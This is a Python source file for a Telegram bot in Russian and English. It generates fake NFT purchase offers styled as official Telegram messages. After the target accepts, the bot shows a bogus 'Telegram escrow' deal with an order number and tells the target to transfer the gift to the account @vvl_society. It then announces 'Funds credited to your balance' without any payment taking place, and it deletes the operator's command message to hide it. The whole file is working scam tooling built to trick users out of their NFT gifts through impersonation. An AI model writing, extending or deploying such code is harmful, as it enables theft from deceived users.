import asyncio
import logging
import os
import re
from aiohttp import web
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardButton, CallbackQuery
from aiogram.utils.keyboard import InlineKeyboardBuilder

BOT_TOKEN = os.environ.get("BOT_TOKEN")

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

active_deals = {}


# ================= ТЕКСТЫ НА ДВУХ ЯЗЫКАХ =================
TEXTS = {
    "ru": {
        "usage": (
            "⚠️ Использование: `.buy <ссылка_на_NFT> <сумма> <валюта> [eu]`\n"
            "Пример: `.buy https://t.me/nft/SnoopDogg-9203 1000 STARS`\n"
            "Для английского добавьте `eu` в конце: "
            "`.buy https://t.me/nft/SnoopDogg-9203 1000 STARS eu`"
        ),
        "invalid_link": (
            "⚠️ Неверная ссылка на NFT.\n"
            "Правильный формат: `https://t.me/nft/Название-Номер`\n"
            "Пример: `https://t.me/nft/SnoopDogg-9203`"
        ),
        "header": "Telegram",
        "offer": "Пользователь предлагает вам",
        "for_gift": "за подарок",
        "valid_for": "Оффер действителен ещё 6 ч. 0 мин.",
        "decline_btn": "❌ Отклонить",
        "accept_btn": "✅ Принять",
        "declined": "❌ Предложение отклонено",
        "not_yours": "⚠️ Эта сделка не для вас.",
        "alert_title": (
            "Внимание!\n\n"
            "Следуйте инструкции, чтобы не потерять подарок и получить оплату.\n\n"
            "Нажмите «ОК», если вы прочитали это сообщение."
        ),
        "deal_lost": "⚠️ Ошибка: данные о сделке утеряны.",
        "deal_title": "NFT Deal",
        "order": "Ордер",
        "buyer_reserved": "Покупатель зарезервировал",
        "via_escrow": "через эскроу-систему Telegram.",
        "escrow_text": (
            "Средства хранятся на специальном эскроу-счёте и будут автоматически "
            "зачислены на ваш баланс Telegram Stars сразу после передачи подарка."
        ),
        "instructions": "Инструкция для завершения сделки:",
        "step1": "1. Передайте подарок пользователю: @vvl_society",
        "step2_prefix": "2. Нажмите «Передать NFT» и выберите",
        "step3": "3. Подтвердите передачу подарка.",
        "link_to_gift": "Ссылка на подарок",
        "final_note": (
            "Telegram зафиксирует транзакцию и моментально зачислит "
            "{amount} {currency} на ваш баланс. Резерв действует 24 часа."
        ),
        "transfer_btn": "Передать NFT",
        "confirm_btn": "Подтвердить передачу",
        "confirmed": "✅ Транзакция подтверждена!",
        "deal_done": "✅ Сделка завершена. Средства зачислены на ваш баланс.",
    },
    "en": {
        "usage": (
            "⚠️ Usage: `.buy <NFT_link> <amount> <currency> [eu]`\n"
            "Example: `.buy https://t.me/nft/SnoopDogg-9203 1000 STARS`\n"
            "For English add `eu` at the end: "
            "`.buy https://t.me/nft/SnoopDogg-9203 1000 STARS eu`"
        ),
        "invalid_link": (
            "⚠️ Invalid NFT link.\n"
            "Correct format: `https://t.me/nft/Name-Number`\n"
            "Example: `https://t.me/nft/SnoopDogg-9203`"
        ),
        "header": "Telegram",
        "offer": "A user offers you",
        "for_gift": "for the gift",
        "valid_for": "Offer is valid for another 6 h. 0 min.",
        "decline_btn": "❌ Decline",
        "accept_btn": "✅ Accept",
        "declined": "❌ Offer declined",
        "not_yours": "⚠️ This deal is not for you.",
        "alert_title": (
            "Attention!\n\n"
            "Follow the instructions to not lose the gift and receive payment.\n\n"
            "Click «OK» if you have read this message."
        ),
        "deal_lost": "⚠️ Error: deal data lost.",
        "deal_title": "NFT Deal",
        "order": "Order",
        "buyer_reserved": "The buyer has reserved",
        "via_escrow": "via the Telegram escrow system.",
        "escrow_text": (
            "The funds are held in a special escrow account and will be automatically "
            "credited to your Telegram Stars balance right after the gift is transferred."
        ),
        "instructions": "Instructions to complete the deal:",
        "step1": "1. Transfer the gift to the user: @vvl_society",
        "step2_prefix": "2. Click «Transfer NFT» and choose",
        "step3": "3. Confirm the gift transfer.",
        "link_to_gift": "Gift link",
        "final_note": (
            "Telegram will record the transaction and instantly credit "
            "{amount} {currency} to your balance. The reservation is valid for 24 hours."
        ),
        "transfer_btn": "Transfer NFT",
        "confirm_btn": "Confirm transfer",
        "confirmed": "✅ Transaction confirmed!",
        "deal_done": "✅ Deal completed. Funds credited to your balance.",
    },
}


# --- Функция: разбор ссылки NFT ---
def parse_nft_link(url):
    match = re.search(r"t\.me/nft/([A-Za-z0-9_]+)-(\d+)", url)
    if not match:
        return None

    name = match.group(1)
    number = match.group(2)

    return {
        "name": name,
        "number": number,
        "full": f"{name} #{number}",
        "url": url
    }


# --- Основная логика команды .buy / /buy ---
async def process_buy(message: types.Message):
    # Удаляем сообщение пользователя (если можем)
    try:
        await message.delete()
    except Exception as e:
        logging.warning(f"Не удалось удалить сообщение: {e}")

    args = message.text.split()

    # Определяем язык
    lang = "ru"
    if len(args) >= 2 and args[-1].lower() == "eu":
        lang = "en"
        args = args[:-1]

    t = TEXTS[lang]

    if len(args) < 4:
        await message.answer(t["usage"])
        return

    nft_link = args[1]
    amount = args[2]
    currency = args[3].upper()

    nft_data = parse_nft_link(nft_link)

    if not nft_data:
        await message.answer(t["invalid_link"])
        return

    nft_title = nft_data["full"]

    text = (
        f"<b>{t['header']}</b>\n"
        f"<b>{nft_title}</b>\n\n"
        f"{t['offer']}\n"
        f"<b>{amount} {currency}</b> {t['for_gift']} {nft_link}.\n\n"
        f"{t['valid_for']}"
    )

    deal_id = f"{message.chat.id}_{message.from_user.id}"

    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(
            text=t["decline_btn"],
            callback_data=f"decline_{message.chat.id}_{message.from_user.id}_{lang}"
        ),
        InlineKeyboardButton(
            text=t["accept_btn"],
            callback_data=f"accept_{message.chat.id}_{message.from_user.id}_{lang}"
        )
    )

    active_deals[deal_id] = {
        "link": nft_link,
        "amount": amount,
        "currency": currency,
        "title": nft_title,
        "lang": lang,
        "user_id": message.from_user.id,
        "chat_id": message.chat.id
    }

    await message.answer(
        text=text,
        reply_markup=builder.as_markup(),
        parse_mode="HTML",
        disable_web_page_preview=False
    )


# --- Обработчики: и /buy, и .buy ---
@dp.message(Command("buy"))
@dp.message(F.text.startswith(".buy"))
async def cmd_buy_handler(message: types.Message):
    await process_buy(message)


# --- Отклонить ---
@dp.callback_query(F.data.startswith("decline_"))
async def process_decline(callback: CallbackQuery):
    # decline_<chat_id>_<user_id>_<lang>
    parts = callback.data.split("_")
    lang = parts[-1] if parts[-1] in TEXTS else "ru"
    t = TEXTS[lang]

    deal_user_id = parts[-2]
    if str(callback.from_user.id) != deal_user_id:
        await callback.answer(t["not_yours"], show_alert=True)
        return

    await callback.message.edit_text(t["declined"])
    await callback.answer()


# --- Принять ---
@dp.callback_query(F.data.startswith("accept_"))
async def process_accept(callback: CallbackQuery):
    # accept_<chat_id>_<user_id>_<lang>
    parts = callback.data.split("_")
    lang = parts[-1] if parts[-1] in TEXTS else "ru"
    t = TEXTS[lang]

    deal_user_id = parts[-2]
    deal_chat_id = parts[-3]

    if str(callback.from_user.id) != deal_user_id:
        await callback.answer(t["not_yours"], show_alert=True)
        return

    await callback.answer(text=t["alert_title"], show_alert=True)
    await asyncio.sleep(1.5)

    deal_id = f"{deal_chat_id}_{deal_user_id}"
    deal = active_deals.get(deal_id)
    if not deal:
        await callback.message.edit_text(t["deal_lost"])
        return

    nft_title = deal["title"]
    nft_url = deal["link"]

    final_text = (
        f"<b>{t['deal_title']}</b>\n\n"
        f"{t['order']} #TG-D721BSTP\n\n"
        f"{t['buyer_reserved']} <b>{deal['amount']} {deal['currency']}</b> "
        f"{t['via_escrow']}\n"
        f"{t['escrow_text']}\n\n"
        f"<b>{t['instructions']}</b>\n"
        f"{t['step1']}\n"
        f"{t['step2_prefix']} <b>{nft_title}</b>\n"
        f"{t['step3']}\n\n"
        f"{t['link_to_gift']}: {nft_url}\n\n"
        f"{t['final_note'].format(amount=deal['amount'], currency=deal['currency'])}"
    )

    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text=t["transfer_btn"], url=nft_url)
    )
    builder.row(
        InlineKeyboardButton(
            text=t["confirm_btn"],
            callback_data=f"confirm_{deal_chat_id}_{deal_user_id}_{lang}"
        )
    )

    await callback.message.edit_text(
        text=final_text,
        reply_markup=builder.as_markup(),
        parse_mode="HTML",
        disable_web_page_preview=False
    )


# --- Подтвердить передачу ---
@dp.callback_query(F.data.startswith("confirm_"))
async def process_confirm(callback: CallbackQuery):
    # confirm_<chat_id>_<user_id>_<lang>
    parts = callback.data.split("_")
    lang = parts[-1] if parts[-1] in TEXTS else "ru"
    t = TEXTS[lang]

    deal_user_id = parts[-2]
    if str(callback.from_user.id) != deal_user_id:
        await callback.answer(t["not_yours"], show_alert=True)
        return

    await callback.answer(t["confirmed"], show_alert=True)
    await callback.message.edit_text(t["deal_done"])


# --- Веб-сервер для Render ---
async def handle(request):
    return web.Response(text="Bot is alive!")


async def main():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', int(os.environ.get("PORT", 8080)))
    await site.start()

    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())